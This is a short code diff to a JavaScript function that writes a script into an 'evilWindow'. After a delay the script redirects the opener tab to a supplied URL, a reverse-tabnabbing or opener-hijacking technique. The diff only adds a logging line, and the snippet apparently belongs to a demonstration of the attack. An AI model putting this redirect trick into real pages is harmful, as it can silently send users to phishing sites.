@@ -25,6 +25,7 @@ function openDoubleWindow(url, top, left, width, height) {
         //plugs the page to be hijacked as opener returnee
         evilWindow.document.write(`
             <script>
+            console.log('Hijacking opener to:', "${url}");
             setTimeout(function() { 
                 opener.location = "${url}"; 
             }, 1000);
